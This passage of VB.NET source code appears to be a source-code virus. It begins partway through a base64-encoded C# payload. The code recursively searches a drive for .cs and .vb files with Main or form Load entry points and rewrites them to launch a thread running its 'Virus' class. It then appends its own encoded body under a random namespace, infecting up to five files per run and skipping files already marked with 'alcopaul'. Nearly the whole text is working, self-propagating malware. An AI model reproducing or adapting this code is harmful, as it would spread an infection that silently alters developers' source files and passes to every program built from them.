DQogICAgICAgICAgICAgICAgc3RyaW5nW10gdCA9IGRhdGFiYXNlLlNwbGl0KG5ldyBjaGFyW10geyAnPicgfSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGJvZHkyID0gZGVjb2RlYjY0KHRbMl0pLlJlcGxhY2UoZGVjb2RlYjY0KCJhRzB4TWpNMCIpLCBuYW1lc3BhY2V4KTsNCiAgICAgICAgICAgICAgICB3cml0ZXJ4KGZpbGUsIHMgKyAiXHJcbiIgKyBib2R5MiArIGRhdGFiYXNlICsgZGVjb2RlYjY0KHRbM10pICsgIlxyXG4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyB2b2lkIHdyaXRlcngoc3RyaW5nIHBhdGgsIHN0cmluZyBkYXRheCkNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgKFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIgc3cgPSBuZXcgU3lzdGVtLklPLlN0cmVhbVdyaXRlcihwYXRoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZShkYXRheCk7DQogICAgICAgICAgICAgICAgc3cuRmx1c2goKTsNCiAgICAgICAgICAgICAgICBzdy5DbG9zZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBkZWNvZGViNjQoc3RyaW5nIGQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKGQpKTsNCiAgICAgICAgfQ0KICAgIH0NCn0="
        Public Sub AndLetsRock(ByVal GGG As System.IO.DirectoryInfo)
            Dim lookfor As String = "*.cs>*.vb"
            Dim extensions As String() = lookfor.Split(New Char() {">"c})
            Dim myfileinfos As New System.Collections.ArrayList()
            For Each ext As String In extensions
                myfileinfos.AddRange(GGG.GetFiles(ext))
            Next
            Dim xfinal As System.IO.FileInfo() = DirectCast(myfileinfos.ToArray(GetType(System.IO.FileInfo)), System.IO.FileInfo())
            For Each x As System.IO.FileInfo In xfinal
                Dim h As String = x.FullName
                Dim ext As String = System.IO.Path.GetExtension(x.FullName)
                Try
                    Dim readerxx As New System.IO.StreamReader(h, System.Text.Encoding.Unicode)
                    Dim gLowxx As String = readerxx.ReadToEnd()
                    readerxx.Close()
                    If ext = ".cs" Then
                        If gLowxx.ToLower().IndexOf("main(") >= 0 Then
                            If gLowxx.IndexOf("alcopaul") >= 0 Then
                            Else
                                infect(h, gLowxx, ext, 0)
                                counter += 1
                                If counter = 5 Then
                                    Return
                                End If
                            End If
                        End If
                    ElseIf ext = ".vb" Then
                        If gLowxx.ToLower().IndexOf("sub main()") >= 0 Then
                            If gLowxx.IndexOf("alcopaul") >= 0 Then
                            Else
                                infect(h, gLowxx, ext, 1)
                                counter += 1
                                If counter = 5 Then
                                    Return
                                End If
                            End If
                        ElseIf gLowxx.IndexOf("_Load(") >= 0 Then
                            If gLowxx.IndexOf("alcopaul") >= 0 Then
                            Else
                                infect(h, gLowxx, ext, 2)
                                counter += 1
                                If counter = 5 Then
                                    Return
                                End If
                            End If
                        End If
                    End If
                Catch ex As Exception
                    Continue For
                End Try
            Next
            Dim dirs As System.IO.DirectoryInfo() = GGG.GetDirectories("*.*")
            For Each j As System.IO.DirectoryInfo In dirs
                Try
                    If counter = 5 Then
                        Return
                    End If
                    AndLetsRock(j)
                Catch ex As Exception
                    Continue For
                End Try
            Next
        End Sub
        Public Sub LOL()
            Dim xx As String = System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName)
            Dim dirx As New System.IO.DirectoryInfo(System.IO.Directory.GetDirectoryRoot(xx))
            AndLetsRock(dirx)
        End Sub
        Public Function decodeb64(ByVal d As String) As String
            Return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(d))
        End Function
        Public Function GetRandomString() As String
            Dim pathx As String = System.IO.Path.GetRandomFileName()
            pathx = pathx.Replace(".", "")
            Return "g" & pathx
        End Function
        Public Sub infect(ByVal file As String, ByVal s As String, ByVal ext As String, ByVal g As Integer)
            namespacex = GetRandomString()
            If ext = ".vb" Then
                Dim gggx As String = ""
                If g = 2 Then
                    Dim gggg As String = s.Substring((s.IndexOf("_Load(") + 6), (s.IndexOf(".Load") - (s.IndexOf("_Load(") + 6)))
                    s = s.Replace(gggg, "")
                    gggx = s.Replace("_Load(.Load", "_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load" & vbCrLf & vbTab & "Dim hxxxx As New " & namespacex & ".Virus" & vbCrLf & vbTab & "Dim gxxxx As New System.Threading.Thread(AddressOf hxxxx.LOL)" & vbCrLf & vbTab & "gxxxx.Start()" & vbCrLf)
                ElseIf g = 1 Then
                    gggx = s.Replace("Sub Main()", "Sub Main()" & vbCrLf & vbTab & "Dim hxxxx As New " & namespacex & ".Virus" & vbCrLf & vbTab & "Dim gxxxx As New System.Threading.Thread(AddressOf hxxxx.LOL)" & vbCrLf & vbTab & "gxxxx.Start()" & vbCrLf)
                End If
                Dim t As String() = database.Split(New Char() {">"c})
                Dim body0 As String = decodeb64(t(0)).Replace(decodeb64("aG0xMjM0"), namespacex)
                writerx(file, gggx & vbCrLf & body0 & database & decodeb64(t(1)) & vbCrLf)
            ElseIf (ext = ".cs") AndAlso (g = 0) Then
                Dim x As Integer = s.ToLower().IndexOf("main(")
                Dim yy As Integer = x
                Dim xx As Char() = s.ToCharArray(0, s.Length - 1)
                While xx(yy) <> "{"c
                    yy += 1
                End While
                Dim yu As String = "Main(string[] args)" & vbCrLf & vbTab & "{" & vbCrLf & vbTab & "System.Threading.Thread gxzxzxzxz = " & "new System.Threading.Thread(" & namespacex & ".Virus.LOL);" & vbCrLf & vbTab & "gxzxzxzxz.Start();"
                s = s.Replace(s.Substring(x, (yy - x) + 1), yu)
                Dim t As String() = database.Split(New Char() {">"c})
                Dim body2 As String = decodeb64(t(2)).Replace(decodeb64("aG0xMjM0"), namespacex)
                writerx(file, s & vbCrLf & body2 & database & decodeb64(t(3)) & vbCrLf)
            End If
        End Sub
        Public Sub writerx(ByVal path As String, ByVal datax As String)
            Dim gx As New System.IO.StreamWriter(path)
            gx.Write(datax)
            gx.Flush()
            gx.Close()
        End Sub
    End Class
End Namespace
